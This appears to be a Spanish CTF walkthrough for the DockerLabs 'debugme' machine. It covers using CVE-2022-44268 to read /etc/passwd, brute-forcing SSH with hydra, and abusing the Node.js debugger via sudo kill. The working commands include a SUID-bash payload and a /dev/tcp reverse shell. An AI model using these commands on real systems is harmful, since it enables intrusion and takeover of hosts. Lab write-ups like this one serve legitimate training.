nmap:  443, 80, 22

![image](https://github.com/user-attachments/assets/49f75831-c32a-4554-9753-b7c610099ee0)


---
entramos a la pagina principal y nos da esto:
![[pagina principal 1.png]]

hay una subida de imagen o pdf y encontré este exploit que roba metadatos: https://github.com/voidz0r/CVE-2022-44268

seguimos los pasos y subimos la imagen 1200x1200
![[imagen subida.png]]

después guardamos la foto desde la pagina subida y al guardarla nos dará muchos números.
![[primer paso nombre.png]]

lanzamos este comando con el numero dentro de los ""

>python3 -c 'print(bytes.fromhex("con el numero que nos dio"))'

y al final dará:
![[etcpasswd.png]]

y nos dará el listado de "/etc/passwd" con un usuario llamado "lenam"

hacemos fuerza bruta

     - hydra -l lenam -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2

nos da la contraseña: loverboy
![[dockerlabs/dificil/debugme/fuerza bruta.png]]
dentro al hacer sudo -l aparece: "kill"
![[kill.png]]
al hacer un "ps aux" vemos que en el PID 53 se ejecuta un "index.js"
![[codigojs.png]]

buscamos en: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse

y vemos que podemos escalar con: kill -s SIGUSR1 nodejs-ps
![[ejecucion 1.png]]

que quedaría:  sudo kill -s SIGUSR1 49 (o según se ejecute en este caso 49)
ahora si ejecutamos: netstat -atunop vemos que se reinicia ya hora esta habitado el puerto 9229
![[nuevopuerto.png]]

nos conectamos por la IP y puerto que da:  node inspect 127.0.0.1:9229

dentro del debug ejecutamos: 

    - exec("process.mainModule.require('child_process').exec('chmod u+s /bin/bash')")

ahora salimos y ejecutamos el bash -p

![[dockerlabs/dificil/debugme/root.png]]

pero no somos root absoluto, modificamos el código para una reverse shell

    - exec("process.mainModule.require('child_process').exec('bash -c \"/bin/bash -i >& /dev/tcp/172.17.0.1/443 0>&1\"')")

![[root absolute.png]]

y somos root!